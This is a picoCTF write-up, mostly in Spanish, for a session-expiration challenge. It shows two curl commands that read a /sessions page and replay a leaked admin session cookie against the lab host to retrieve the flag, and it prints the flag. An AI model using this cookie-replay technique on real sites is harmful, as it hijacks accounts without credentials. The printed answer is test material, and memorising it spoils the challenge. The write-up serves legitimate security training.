# Descripción
Proper session timeout controls are critical for securing user accounts. If a user logs in on a public or shared computer but doesn’t explicitly log out (instead simply closing the browser tab), and session expiration dates are misconfigured, the session may remain active indefinitely.
This then allows an attacker using the same browser later to access the user’s account without needing credentials, exploiting the fact that sessions never expire and remain authenticated.
Additional details will be available after

# Solución
Ingresamos a la pagina y nos registramos con cualquier nombre de usuario y contraseña, una vez adentro vemos que hay un mensaje que dice que hay una pagina extraña llamada /sessions, pero primero rescatamos la cookie que nos dieron al ingresar, una vez la tenemos la utilizamos para acceder a la info de sessions:

```
curl -L http://dolphin-cove.picoctf.net:59681/sessions \               
-H "Cookie: session=5Z3Bj9YhZavphZ5oxpcjKtr9vjAJD9a6zVHaHOUB78g"
```

ahí observamos que todavía esta activa la sesión del admin, y también incluye su cookie de autenticación. La utilizamos con curl para acceder:

```
curl -L http://dolphin-cove.picoctf.net:59681/ \                       
-H "Cookie: session=9e5bI1VE7ljIpnNRI2pW0vmM5BP0OkJWtLhHJg-Yytc" | grep picoCTF
```

y encontramos la flag:

picoCTF{s3t_s3ss10n_3xp1rat10n5_51c526ab}
# Notas adicionales
- 
# Referencias
- 